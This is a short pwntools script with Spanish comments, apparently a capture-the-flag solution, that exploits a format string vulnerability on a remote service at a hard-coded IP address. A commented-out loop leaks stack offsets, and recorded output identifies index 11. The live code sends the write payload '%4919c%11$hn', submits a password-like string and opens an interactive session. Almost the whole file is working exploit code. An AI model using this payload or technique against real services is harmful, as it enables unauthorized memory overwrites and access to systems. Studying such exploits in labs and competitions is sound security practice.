from pwn import *

context.log_level = 'error'

"""
for i in range(1, 100):
    io = remote("54.224.65.7", 22222)

    io.recv()
    io.sendline(f"%{i}$p".encode())

    io.recvuntil(" [!] Interesante \n")

    print(f"[+] {i} : ", io.recvline())

    io.close()
"""
# [+] 10 :  b'0x10f3c0de\n'
# [+] 11 :  b'0x7fffffffebe0\n'
# Por conesecuencia su address de0x10f3c0de es el index 11

io = remote("54.224.65.7", 22222)

io.recv()
io.sendline(f"%4919c%11$hn".encode())

io.recv()
io.sendline("f0ll02Th3R4bb1t")

io.interactive()